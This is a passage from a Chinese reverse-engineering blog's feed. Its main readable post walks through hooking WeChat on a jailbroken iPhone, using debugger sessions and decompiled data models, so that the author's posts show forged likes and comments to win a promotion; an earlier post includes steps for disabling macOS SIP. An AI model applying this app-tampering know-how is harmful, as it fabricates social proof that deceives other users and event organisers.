href="https://www.silabs.com/products/development-tools/software/usb-to-uart-bridge-vcp-drivers" target="_blank" rel="external">这里</a>。安装完以后在<code>/dev</code>就应该有一个<code>tty.SLAB_USBtoUART</code>的文件。说明通信的端口已经建立，这时候再IDE中选择该端口。</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/Arduino-ESP8266-bigstep/image-20190730145909934.png?raw=true" width="500" hegiht="313" align="center"></p><h4 id="资源链接"><a href="#资源链接" class="headerlink" title="资源链接"></a>资源链接</h4><p>这里我提供一些我在搭建过程中搜到的一些资源，可以参考一下</p><ul><li><p><a href="https://www.arduino.cc/en/guide/macOSX?setlang=cn" target="_blank" rel="external">https://www.arduino.cc/en/guide/macOSX?setlang=cn</a></p><p>在Mac OS X系统上入门Arduino/ Genuino</p></li><li><p><a href="https://juejin.im/post/5b569026e51d4513ee6dd509" target="_blank" rel="external">https://juejin.im/post/5b569026e51d4513ee6dd509</a></p><p>Esp8266+Arduino+Mac开发环境搭建</p></li><li><p><a href="https://www.open-homeautomation.com/2016/06/10/program-an-esp8266-from-arduino-on-macos/" target="_blank" rel="external">https://www.open-homeautomation.com/2016/06/10/program-an-esp8266-from-arduino-on-macos/</a></p><p>Program an ESP8266 from Arduino on MacOS</p></li><li><p><a href="https://github.com/adrianmihalko/ch340g-ch34g-ch34x-mac-os-x-driver">https://github.com/adrianmihalko/ch340g-ch34g-ch34x-mac-os-x-driver</a></p><p>CH340G CH34G CH34X Mac OS X driver</p></li><li><p><a href="http://www.nodemcu.com" target="_blank" rel="external">http://www.nodemcu.com</a></p><p>资料下载访问官网</p></li><li><p><a href="https://pan.baidu.com/s/1ZCjaSJLNpQWL7CPOpkH-dg" target="_blank" rel="external">https://pan.baidu.com/s/1ZCjaSJLNpQWL7CPOpkH-dg</a></p><p>NODEMCU资料</p></li><li><p><a href="http://www.wch.cn/download/CH341SER_MAC_ZIP.html" target="_blank" rel="external">http://www.wch.cn/download/CH341SER_MAC_ZIP.html</a></p><p>mac串口驱动下载地址</p></li><li><p><a href="https://freeware.the-meiers.org/" target="_blank" rel="external">https://freeware.the-meiers.org/</a></p><p>CoolTerm串口监控工具下载</p></li><li><p>SIP禁用步骤</p><pre><code>1. 重启mac，在出现苹果标志和进度条的时候按住 cmd+r2. 终端中输入csrutil disable/status/enabled3. 重启mac</code></pre></li></ul><h4 id="AVR逆向基础"><a href="#AVR逆向基础" class="headerlink" title="AVR逆向基础"></a>AVR逆向基础</h4><p>下面我们就来熟悉一下这个系统，包括代码环境，编译环境，常见库，开发相关。还是以一些demo代码作为学习。</p><p>由于我们主要是研究iOT逆向，所以可能不会关注在实际开发上面。这里先学习下Arduino上面的执行文件格式，以及指令架构等。</p><p>我们通常说的Arduino上面就运行的是一个AVR指令架构的处理器。</p><blockquote><p>AVR refers to the line of MCUs manufactured by Atmel and used in the original designs.</p></blockquote><p>由于ida对这个执行文件的支持不是很好，我们准备用<a href="https://github.com/radare/radare2">radare2</a>来分析这个bin文件。</p><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><ul><li><p><a href="https://blog.csdn.net/iotisan/article/details/78766463" target="_blank" rel="external">https://blog.csdn.net/iotisan/article/details/78766463</a></p><p>和ESP8266 Arduino谈场恋爱 01 一条具有中国特色的开发环境安装道路</p></li><li><p><a href="https://www.reddit.com/r/arduino/comments/9jlz5g/any_nodemcu_esp8266_drivers_for_macos_mojave/" target="_blank" rel="external">https://www.reddit.com/r/arduino/comments/9jlz5g/any_nodemcu_esp8266_drivers_for_macos_mojave/</a></p><p>Any NodeMCU esp8266 Drivers for MacOS Mojave?</p></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;Arduino-ESP8266开发板上手实践&quot;&gt;&lt;a href=&quot;#Arduino-ESP8266开发板上手实践&quot; class=&quot;headerlink&quot; title=&quot;Arduino ESP8266开发板上手实践&quot;&gt;&lt;/a&gt;Arduino ESP8266开发板上手
      
    
    </summary>
    
      <category term="IOT" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/IOT/"/>
    
    
      <category term="Arduino" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Arduino/"/>
    
      <category term="IOT" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/IOT/"/>
    
  </entry>
  
  <entry>
    <title>Electron跨平台App实战分析</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/07/29/Electron-app-reversing/Electron-app-reversing/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/07/29/Electron-app-reversing/Electron-app-reversing/</id>
    <published>2019-07-29T03:59:49.000Z</published>
    <updated>2019-07-29T14:45:34.468Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none">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</div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
      <category term="RE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/RE/"/>
    
    
      <category term="Electron" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Electron/"/>
    
      <category term="RE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/RE/"/>
    
  </entry>
  
  <entry>
    <title>Android完全禁用Accessibility（通杀一切基于此的外挂）</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/07/24/android-disableAccessibility/android-disableAccessibility/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/07/24/android-disableAccessibility/android-disableAccessibility/</id>
    <published>2019-07-24T12:02:54.000Z</published>
    <updated>2019-07-30T07:52:20.330Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
      <category term="RE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/RE/"/>
    
    
      <category term="RE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/RE/"/>
    
      <category term="Accessibility" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Accessibility/"/>
    
  </entry>
  
  <entry>
    <title>微信集赞/评论插件分析及开发</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/07/22/fkwechatLike/fkwechatLike/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/07/22/fkwechatLike/fkwechatLike/</id>
    <published>2019-07-22T02:22:01.000Z</published>
    <updated>2019-07-28T13:58:12.611Z</updated>
    
    <content type="html"><![CDATA[<h3 id="微信集赞-评论插件分析及开发"><a href="#微信集赞-评论插件分析及开发" class="headerlink" title="微信集赞/评论插件分析及开发"></a>微信集赞/评论插件分析及开发</h3><h4 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h4><p>为什么要做这个集赞的插件呢？起因是上周去参加了某个会议，有一个集赞60领玩偶的活动，但是想到平时一条朋友圈也就几个赞，而且又不想找人点赞，领不到，很气。回去以后想着能不能写一个集赞的插件，在需要的时候直接输入想要的赞、评论数量，我发的朋友圈就能有多少赞。这样再有这样的活动岂不美哉。准备开干！</p><h4 id="理性分析"><a href="#理性分析" class="headerlink" title="理性分析"></a>理性分析</h4><p>再开始之前，先理性分析一波：如果想要集赞，这里有两种思路，一个是直接在view层去更改，但是这样得去处理界面的一些细节，一旦不注意，很容易崩溃。还有种思路是更改datasource或者说赞评论的模型。可以想到，最初一条朋友圈肯定是从服务器拿到数据并封装成对应的模型。一般来说，越改底层的数据或者说源头的数据，那么稳定性和真实性就更高。这里我的想法就是既不改view层，也不改源头层，就改封装好的模型那一层应该就很符合要求。接下来主要讲一下怎么我去实现这个需求的分析过程，因为本身功能不是很复杂，大佬随便看看就行。</p><h4 id="准备条件"><a href="#准备条件" class="headerlink" title="准备条件"></a>准备条件</h4><ul><li>一台mac</li><li>一台越狱的iOS设备</li><li>ida/Hooper/theos</li><li>flex/issh/xia0LLDB</li><li>其他常见逆向工具等</li></ul><p>对于一贯喜欢上调试器分析得我，所以写了<a href="https://github.com/4ch12dy/issh">iSSH</a>和<a href="https://github.com/4ch12dy/xia0LLDB">xia0LLDB</a>两个工具，在这两个工具的辅助下整个插件用了2小时就完成了逆向分析和代码实现。</p><h4 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h4><h5 id="逆向赞和评论的数据模型"><a href="#逆向赞和评论的数据模型" class="headerlink" title="逆向赞和评论的数据模型"></a>逆向赞和评论的数据模型</h5><p>一切从界面入手，这里分析界面我一般喜欢用flex，在微信的朋友圈界面，用flex很容易发现当前界面的控制器为<code>WCTimeLineViewController</code>而且界面是一个<code>UITableView</code></p><p>将wechat执行文件拖入Hooper（<del>wechat文件太大，ida分析会很卡</del>）找到UITableView的代理方法：<br><code>-[WCTimeLineViewController tableView:cellForRowAtIndexPath:]</code></p><p>这里面肯定会根据模型去设置cell数据</p><pre><code class="objective-c">  r2 = [r28 section];  var_70 = r25;  r24 = [r25 calcDataItemIndex:r2];  r25 = [[MMServiceCenter defaultCenter] retain];  r2 = [WCFacade class];  var_78 = r28;  r0 = [r25 getService:r2];  r0 = [r0 retain];  r24 = [[r0 getTimelineDataItemOfIndex:r24] retain];  [r0 release];  [r25 release];  r19 = [[MMServiceCenter defaultCenter] retain];  r0 = [r19 getService:[WCFacade class]];  r0 = [r0 retain];  r25 = [[r0 getLayerIdForDataItem:r24] retain];  [r0 release];  [r19 release];  r19 = [[MMServiceCenter defaultCenter] retain];  r0 = [r19 getService:[WCFacade class]];  r0 = [r0 retain];  r20 = r0;  r0 = [r0 getShowTip:r24 layerId:r25];  r29 = r29;  r26 = [r0 retain];  [r20 release];  [r19 release];</code></pre><p>整理下来就是</p><p><code>[[MMServiceCenter defaultCenter] getService:[WCFacade class]]</code>会得到一个<code>WCFacade</code>对象，然后通过</p><p><code>[WCFacade getTimelineDataItemOfIndex:]</code>就能得到cell的数据</p><p>看到这里，上调试器！看下都是什么数据…</p><p>将设备用数据线连接上电脑（这里我推荐用数据线的方式，wifi延时太高，影响心情），手机上打开微信</p><p>直接输入<code>issh debug -a wechat</code>就能挂上微信</p><pre><code class="shell">xia0 ~ $ issh debug -a wechat[I]:iproxy process for 2222 port alive, pid=1382[I]:++++++++++++++++++ Nice to Work :) +++++++++++++++++++++[I]:iOSRE dir exist[I]:iproxy process for 1234 port alive, pid=1395[I]:Run ps -e | grep debugserver | grep -v grep; [[ 0 == 0 ]] &amp;&amp; (killall -9 debugserver 2&gt; /dev/null)[I]:/iOSRE/tools/debugserver file exist, Start debug...[I]:Run /iOSRE/tools/debugserver 127.0.0.1:1234 -a wechat</code></pre><p>打开另一个终端进行调试（我的lldb已经安装了xia0LLDB脚本）</p><pre><code>xia0 ~ $ lldb&quot;xutil&quot; command installed -&gt; xutil&quot;choose&quot; command installed -&gt; choose&quot;xbr&quot; command installed --&gt; xbr -[UIView initWithFrame:]&quot;sbt&quot; command installed -&gt; sbt// 连接到远端(lldb) pcc</code></pre><p>这里有两种方法：</p><p>一种是用<code>xbr &quot;-[WCTimeLineViewController tableView:cellForRowAtIndexPath:]&quot;</code>下断点去查看；</p><pre><code>// 对-[WCTimeLineViewController tableView:cellForRowAtIndexPath:]方法下断点(lldb) xbr &quot;-[WCTimeLineViewController tableView:cellForRowAtIndexPath:]&quot;(lldb) c</code></pre><p>第二种是由于lldb支持choose命令，可以直接拿到<code>WCFacade</code>对象。既然如此选choose</p><pre><code>(lldb) choose WCFacade&lt;__NSArrayM 0x2823d9860&gt;(&lt;WCFacade: 0x139e1c030&gt;)</code></pre><p>调用其<code>getTimelineDataItemOfIndex:</code>方法就能拿到第一条朋友圈的数据</p><pre><code>(lldb) po [0x139e1c030 getTimelineDataItemOfIndex:0]Class name: WCDataItem, addr: 0x13e2871d0tid: 13121667995275047007username: wxid_6913ohfkk7kq12createtime: 1564224719commentUsers: ()contentObj: &lt;WCContentItem: 0x2801f5500&gt;</code></pre><p>输入<code>ivars 0x13e2871d0</code>就能拿到对象的所有属性值</p><pre><code>(lldb) ivars 0x13e2871d0&lt;WCDataItem: 0x13e2871d0&gt;:in WCDataItem:    cid (int): 0    tid (NSString*): @&quot;13121667995275047007&quot;    type (int): 0    flag (int): 0    username (NSString*): @&quot;wxid_6913ohfkk7kq12&quot;    nickname (NSString*): @&quot;xia0&quot;    createtime (int): 1564224719    locationInfo (WCLocationInfo*): &lt;WCLocationInfo: 0x2801f7800&gt;    likeFlag (BOOL): NO    likeCount (int): 0    likeUsers (NSMutableArray*): &lt;__NSArrayM: 0x286152d90&gt;    commentCount (int): 0    commentUsers (NSMutableArray*): &lt;__NSArrayM: 0x2861539c0&gt;    contentObj (WCContentItem*): &lt;WCContentItem: 0x2801f5500&gt;    appInfo (WCAppInfo*): &lt;WCAppInfo: 0x287404080&gt;    contentDesc (NSString*): @&quot;test&quot;</code></pre><p>由于属性太多，这里我就只显示了一些比较关心的数据，可以看到这就是我发的一条内容为test的朋友圈。</p><p>里面我们还发现了<code>likeUsers</code>和<code>commentUsers</code>的字段，冷静思考就知道应该就是对应的赞和评论列表。我先给自己点个赞看下里面的数据。</p><pre><code>likeCount (int): 1likeUsers (NSMutableArray*): &lt;__NSArrayM: 0x283e37060&gt;</code></pre><p>发现赞的数量变为1了，在看下里面的内容</p><pre><code>(lldb) po 0x283e37060&lt;__NSArrayM 0x283e37060&gt;(Class name: WCUserCommentusername: wxid_6913ohfkk7kq12nickname: xia0content:source: 0type: 1createTime: 1564225007isLocalAdded: 0commentID: (null)comment64ID: (null)refCommentID: (null)refComment64ID: (null)refUserName:bDeleted: 0)</code></pre><p>正是我自己的微信号。同理可以得到评论</p><pre><code>commentCount (int): 1commentUsers (NSMutableArray*): &lt;__NSArrayM: 0x283e349c0&gt;(lldb) po 0x283e349c0&lt;__NSArrayM 0x283e349c0&gt;(Class name: WCUserCommentusername: wxid_6913ohfkk7kq12nickname: xia0content: 评论测试source: 0type: 2createTime: 1564225144isLocalAdded: 1commentID: (null)comment64ID: (null)refCommentID: (null)refComment64ID: (null)refUserName: (null)bDeleted: 0)</code></pre><p>到这里我们还可以发现赞和评论都是一个类（模型），只是里面的类型字段不同。现在我们其实已经拿到了我们想要的数据模型了。但是还有一个问题在于我们应该什么时候去更改这些数据呢？也就是我们说的hook点。</p><p>最好的hook可以想到是每次刷新数据的时候，这样我们的数据就是最新的。</p><h5 id="寻找HOOK点"><a href="#寻找HOOK点" class="headerlink" title="寻找HOOK点"></a>寻找HOOK点</h5><p>先想一下，刷新数据的时候，当拿到新的数据肯定会封装为一个<code>WCDataItem</code>对象，那么我们可以对<code>WCDataItem</code>里面的方法下断点，然后打印调用链不就反向得到了刷新的函数了吗？</p><p>但是逆向和调试过微信的人都知道，当你使用bt命令的时候只能得到一堆无符号的调用栈像下面这样</p><pre><code>(lldb) bt* thread #1, queue = &#39;com.apple.main-thread&#39;, stop reason = breakpoint 4.1  * frame #0: 0x000000010857d4d0 WeChat`_mcwxh_dydx33_8to8(_VDecStruct*, unsigned char*, unsigned char*, unsigned int, unsigned int, unsigned int, unsigned int) + 30312888    frame #1: 0x0000000194fcc638 Foundation`_decodeObjectBinary + 2004    frame #2: 0x0000000194fcbb6c Foundation`_decodeObject + 340    frame #3: 0x0000000194ed24fc Foundation`-[NSKeyedUnarchiver decodeObjectForKey:] + 228    frame #4: 0x0000000194f2a09c Foundation`+[NSKeyedUnarchiver unarchiveObjectWithData:] + 92    frame #5: 0x0000000105a88404 WeChat`int fmt::internal::CharTraits&lt;char&gt;::format_float&lt;long double&gt;(char*, unsigned long, char const*, unsigned int, int, long double) + 2432992    frame #6: 0x0000000108da9ea8 WeChat`_mcwxh_dydx33_8to8(_VDecStruct*, unsigned char*, unsigned char*, unsigned int, unsigned int, unsigned int, unsigned int) + 38884240    frame #7: 0x0000000108daa890 WeChat`_mcwxh_dydx33_8to8(_VDecStruct*, unsigned char*, unsigned char*, unsigned int, unsigned int, unsigned int, unsigned int) + 38886776    frame #8: 0x0000000108dad178 WeChat`_mcwxh_dydx33_8to8(_VDecStruct*, unsigned char*, unsigned char*, unsigned int, unsigned int, unsigned int, unsigned int) + 38897248    frame #9: 0x0000000108717394 WeChat`_mcwxh_dydx33_8to8(_VDecStruct*, unsigned char*, unsigned char*, unsigned int, unsigned int, unsigned int, unsigned int) + 31991932</code></pre><p>但是用我写的sbt命令就能恢复oc符号，下面我们对<code>-[WCDataItem setCid:]</code>下断点，然后得到调用栈</p><pre><code>(lldb) sbt==========================================xia0LLDB==========================================  BlockSymbolFile    Not Set The Block Symbol Json File, Try &#39;sbt -f&#39;============================================================================================  frame #0: [file:0x103c094d0 mem:0x10857d4d0] WeChat`-[WCDataItem setCid:] + 0  frame #1: [file:0x18193c638 mem:0x194fcc638] Foundation`_decodeObjectBinary + 2004  frame #2: [file:0x18193bb6c mem:0x194fcbb6c] Foundation`_decodeObject + 340  frame #3: [file:0x1818424fc mem:0x194ed24fc] Foundation`-[NSKeyedUnarchiver decodeObjectForKey:] + 228  frame #4: [file:0x18189a09c mem:0x194f2a09c] Foundation`+[NSKeyedUnarchiver unarchiveObjectWithData:] + 92  frame #5: [file:0x101114404 mem:0x105a88404] WeChat`+[CUtility SafeUnarchiveFromData:] + 64  frame #6: [file:0x104435ea8 mem:0x108da9ea8] WeChat`-[WCAdvertiseDataHelper hasCommented:] + 116  frame #7: [file:0x104436890 mem:0x108daa890] WeChat`-[WCAdvertiseDataHelper IsAdvertiseDataValid:] + 48  frame #8: [file:0x104439178 mem:0x108dad178] WeChat`-[WCAdvertiseDataHelper getAdvertiseDataByCurMinTime:MaxTime:] + 552  frame #9: [file:0x103da3394 mem:0x108717394] WeChat`Maybe c function? Distance:3348 &gt;= 2500 # Symbol:-[WCTimelineMgr tryRemoveCachesOfLikeUserWithNewTimelineList:] + 3348  frame #10: [file:0x206a0 mem:0x1131f06a0] WeChat`-[WCTimelineMgr onDataUpdated:andData:andAdData:withChangedTime:] + 233  frame #11: [file:0x103db00c8 mem:0x1087240c8] WeChat`Maybe c function? Distance:9732 &gt;= 2500 # Symbol:-[WCTimelineDataProvider responseForSnsTimeLineResponse:Event:] + 9732  frame #12: [file:0x103db0398 mem:0x108724398] WeChat`-[WCTimelineDataProvider 